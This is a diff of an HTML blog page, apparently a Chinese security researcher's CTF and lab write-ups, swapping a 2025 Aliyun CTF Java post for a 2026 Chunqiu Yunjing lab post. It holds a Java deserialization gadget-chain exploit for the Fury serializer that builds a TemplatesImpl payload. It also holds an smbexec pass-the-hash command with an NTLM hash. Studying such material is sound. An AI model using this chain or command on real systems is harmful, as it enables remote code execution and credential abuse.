class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFieldValue</span><span class="params">(Object obj, String fieldName, Object value)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">declaredField</span> <span class="operator">=</span> obj.getClass().getDeclaredField(fieldName);</span><br><span class="line">        declaredField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        declaredField.set(obj, value);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="comment">///templates</span></span><br><span class="line"></span><br><span class="line">        <span class="type">InputStream</span> <span class="variable">inputStream</span> <span class="operator">=</span> Main.class.getResourceAsStream(<span class="string">&quot;TemplatesImpl_RuntimeEvil.class&quot;</span>);</span><br><span class="line">        <span class="type">byte</span>[]   bytes       = <span class="keyword">new</span> <span class="title class_">byte</span>[inputStream.available()];</span><br><span class="line">        inputStream.read(bytes);</span><br><span class="line"></span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">tmpl</span>      <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        <span class="type">Field</span>    <span class="variable">bytecodes</span> <span class="operator">=</span> TemplatesImpl.class.getDeclaredField(<span class="string">&quot;_bytecodes&quot;</span>);</span><br><span class="line">        bytecodes.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        bytecodes.set(tmpl, <span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;bytes&#125;);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">name</span> <span class="operator">=</span> TemplatesImpl.class.getDeclaredField(<span class="string">&quot;_name&quot;</span>);</span><br><span class="line">        name.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        name.set(tmpl, <span class="string">&quot;hello&quot;</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">tmpl1</span>      <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        <span class="type">Field</span>    <span class="variable">bytecodes1</span> <span class="operator">=</span> TemplatesImpl.class.getDeclaredField(<span class="string">&quot;_bytecodes&quot;</span>);</span><br><span class="line">        bytecodes1.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        bytecodes1.set(tmpl1, <span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;bytes&#125;);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">name1</span> <span class="operator">=</span> TemplatesImpl.class.getDeclaredField(<span class="string">&quot;_name&quot;</span>);</span><br><span class="line">        name1.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        name1.set(tmpl1, <span class="string">&quot;hello2&quot;</span>);</span><br><span class="line">        <span class="comment">///templates</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">prop</span> <span class="operator">=</span> <span class="string">&quot;digester&quot;</span>;</span><br><span class="line">        <span class="type">PropertyComparator</span> <span class="variable">propertyComparator</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">PropertyComparator</span>(prop);</span><br><span class="line">        <span class="type">Fury</span> <span class="variable">fury</span> <span class="operator">=</span> Fury.builder().withLanguage(Language.JAVA)</span><br><span class="line">                .requireClassRegistration(<span class="literal">false</span>)</span><br><span class="line">                .build();</span><br><span class="line">        <span class="comment">////jdk</span></span><br><span class="line"></span><br><span class="line">        <span class="type">Object</span> <span class="variable">templatesImpl1</span> <span class="operator">=</span> tmpl1;</span><br><span class="line">        <span class="type">Object</span> <span class="variable">templatesImpl</span> <span class="operator">=</span> tmpl;</span><br><span class="line"></span><br><span class="line">        <span class="type">PropertyComparator</span> <span class="variable">propertyComparator1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">PropertyComparator</span>(<span class="string">&quot;outputProperties&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">PriorityQueue</span> <span class="variable">priorityQueue1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">PriorityQueue</span>(<span class="number">2</span>, propertyComparator1);</span><br><span class="line">        ReflectUtil.setFieldValue(priorityQueue1, <span class="string">&quot;size&quot;</span>, <span class="string">&quot;2&quot;</span>);</span><br><span class="line">        Object[] objectsjdk = &#123;templatesImpl1, templatesImpl&#125;;</span><br><span class="line">        setFieldValue(priorityQueue1, <span class="string">&quot;queue&quot;</span>, objectsjdk);</span><br><span class="line">        <span class="comment">/////jdk</span></span><br><span class="line"></span><br><span class="line">        <span class="type">byte</span>[] data = SerializeUtil.serialize(priorityQueue1);</span><br><span class="line"></span><br><span class="line">        <span class="type">Map</span> <span class="variable">hashmap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        hashmap.put(prop, data);</span><br><span class="line"></span><br><span class="line">        <span class="type">MapProxy</span> <span class="variable">mapProxy</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">MapProxy</span>(hashmap);</span><br><span class="line">        <span class="type">ObjectCreationFactory</span>  <span class="variable">test</span> <span class="operator">=</span> (ObjectCreationFactory) Proxy.newProxyInstance(ObjectCreationFactory.class.getClassLoader(), <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;ObjectCreationFactory.class&#125;, mapProxy);</span><br><span class="line">        <span class="type">ObjectCreationFactory</span>  <span class="variable">test1</span> <span class="operator">=</span> (ObjectCreationFactory) Proxy.newProxyInstance(ObjectCreationFactory.class.getClassLoader(), <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;ObjectCreationFactory.class&#125;, mapProxy);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="type">PriorityQueue</span> <span class="variable">priorityQueue</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">PriorityQueue</span>(<span class="number">2</span>, propertyComparator);</span><br><span class="line">        ReflectUtil.setFieldValue(priorityQueue, <span class="string">&quot;size&quot;</span>, <span class="string">&quot;2&quot;</span>);</span><br><span class="line">        Object[] objects = &#123;test, test1&#125;;</span><br><span class="line">        setFieldValue(priorityQueue, <span class="string">&quot;queue&quot;</span>, objects);</span><br><span class="line"></span><br><span class="line">        <span class="type">byte</span>[] serialize = fury.serialize(priorityQueue);</span><br><span class="line">        System.out.println(Base64.getEncoder().encodeToString(serialize));</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>题目不出网，Server默认回显&#x2F;tmp&#x2F;desc.txt的内容</p>
-<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250228145847451.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250228145847451.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
-<h2 id="Espresso-Coffee"><a href="#Espresso-Coffee" class="headerlink" title="Espresso Coffee"></a>Espresso Coffee</h2><p>尼玛，ROP我做个蛋啊。不做了</p>
+<p>哎哟我操，一直打不出来，急死我了。</p>
+<p>python smbexec.py -hashes :EBC447441306783742EE3DF769051B75 vertexsoft.local&#x2F;<a href="mailto:&#x61;&#100;&#x6d;&#x69;&#x6e;&#105;&#115;&#x74;&#x72;&#97;&#116;&#111;&#x72;&#64;&#x31;&#57;&#50;&#46;&#49;&#x36;&#x38;&#46;&#x31;&#46;&#x31;&#49;">&#x61;&#100;&#x6d;&#x69;&#x6e;&#105;&#115;&#x74;&#x72;&#97;&#116;&#111;&#x72;&#64;&#x31;&#57;&#50;&#46;&#49;&#x36;&#x38;&#46;&#x31;&#46;&#x31;&#49;</a> -codec gbk</p>
 
       </div>
       <div class="post-tags-categories">
         
         <div class="tags">
           
-            <a href="/tags/CTF/" class="">
-              CTF
+            <a href="/tags/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C/" class="">
+              春秋云镜
             </a>
           
         </div>
@@ -766,7 +810,7 @@
     </li>
     <li class="post-copyright-link">
     <strong>文章链接:  </strong>
-    <a href="/2025/02/28/2025aliyun-ctf-java/" target="_blank" title="2025Aliyun CTF Jtools">https://godownio.github.io/2025/02/28/2025aliyun-ctf-java/</a>
+    <a href="/2026/03/24/chun-qiu-yun-jing-vertex/" target="_blank" title="春秋云镜 Vertex">https://godownio.github.io/2026/03/24/chun-qiu-yun-jing-vertex/</a>
     </li>
     <li class="post-copyright-license">
       <strong>版权声明:   </strong>
@@ -784,39 +828,23 @@
 
 
 
-  
-  <div class="post-nav-prev post-nav-item">
-    <div class="post-nav-img" style="background-size: cover; 
-      background-position: center center;">
-      <img class="lazyload lazyload placeholder" src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/%E5%9B%BE%E7%89%87%E7%B4%A0%E6%9D%90/1080P%20A%20%E6%94%B6%E8%97%8F%E9%87%8F%E6%9C%80%E5%A4%9A/1080PA%E5%A3%81%E7%BA%B8134.jpg" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/%E5%9B%BE%E7%89%87%E7%B4%A0%E6%9D%90/1080P%20A%20%E6%94%B6%E8%97%8F%E9%87%8F%E6%9C%80%E5%A4%9A/1080PA%E5%A3%81%E7%BA%B8134.jpg" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="">
-    </div>
-    <a href="/2025/03/05/rasp-de-rao-guo-dan-hui-xian-jni-nei-cun-ma/" class="post-nav-link">
-      <div class="title">
-        <i class="fas fa-angle-left"></i> 上一篇:
-        <div class="title-text">RASP的绕过 单回显JNI内存马</div>
-      </div>
-      
-      <!-- <div class="content">
-        RASP绕过rasp从0到1：https://godownio.github.io/2024/12/30/rasp-de
-      </div> -->
-    </a>
-  </div>
-
 
 
   
   <div class="post-nav-next post-nav-item">
     <div class="post-nav-img" style="background-size: cover; 
       background-position: center center;">
-      <img class="lazyload lazyload placeholder" src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/%E5%9B%BE%E7%89%87%E7%B4%A0%E6%9D%90/1080P%20A%20%E6%94%B6%E8%97%8F%E9%87%8F%E6%9C%80%E5%A4%9A/1080PA%E5%A3%81%E7%BA%B8132.jpg" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/%E5%9B%BE%E7%89%87%E7%B4%A0%E6%9D%90/1080P%20A%20%E6%94%B6%E8%97%8F%E9%87%8F%E6%9C%80%E5%A4%9A/1080PA%E5%A3%81%E7%BA%B8132.jpg" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" src="" alt="">
+      <img class="lazyload lazyload placeholder" src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/%E5%9B%BE%E7%89%87%E7%B4%A0%E6%9D%90/1080P%20A%20%E6%94%B6%E8%97%8F%E9%87%8F%E6%9C%80%E5%A4%9A/1080PA%E5%A3%81%E7%BA%B8193.jpg" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/%E5%9B%BE%E7%89%87%E7%B4%A0%E6%9D%90/1080P%20A%20%E6%94%B6%E8%97%8F%E9%87%8F%E6%9C%80%E5%A4%9A/1080PA%E5%A3%81%E7%BA%B8193.jpg" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" src="" alt="">
     </div>
-    <a href="/2025/02/26/tomcat-xia-huo-qu-standardcontext-de-fang-fa-jsp-zhuan-java-nei-cun-ma/" class="post-nav-link">
+    <a href="/2026/03/19/alictf-2025-web-java/" class="post-nav-link">
       <div class="title">
         下一篇: <i class="fas fa-angle-right"></i>
-        <div class="title-text">Tomcat下获取StandardContext的方法(JSP转Java内存马)</div>
+        <div class="title-text">Alictf 2026 javaweb</div>
       </div>
       <!-- <div class="content">
-        2025凑一下2020年的热闹，本文将介绍各环境下获取StandardContext的办法，以及直接写response回
+        文章预计首发先知…晚点贴
+第四届阿里ctf，看下几个java题，每年的传统了
+https://www.aliyunctf
       </div> -->
     </a>
   </div>
@@ -1037,7 +1065,7 @@
   <div class='content'>
     <div class="toc-main">
       <div class="toc-content">
-        <!-- <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Jtools"><span class="toc-text">Jtools</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%89%BE%E5%88%B0%E5%85%A5%E5%8F%A3"><span class="toc-text">找到入口</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#compare"><span class="toc-text">compare</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#fury%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E8%A7%A6%E5%8F%91compare"><span class="toc-text">fury反序列化触发compare</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BB%95%E9%BB%91%E5%90%8D%E5%8D%95"><span class="toc-text">绕黑名单</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Espresso-Coffee"><span class="toc-text">Espresso Coffee</span></a></li></ol> -->
+        <!-- <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Vertex"><span class="toc-text">春秋云镜 Vertex</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#flag1"><span class="toc-text">flag1</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#flag2"><span class="toc-text">flag2</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#flag3"><span class="toc-text">flag3</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#flag4"><span class="toc-text">flag4</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#flag5"><span class="toc-text">flag5</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#flag6"><span class="toc-text">flag6</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#flag7"><span class="toc-text">flag7</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#flag8"><span class="toc-text">flag8</span></a></li></ol></li></ol> -->
         <div class="toc"></div>
       </div>
     </div>
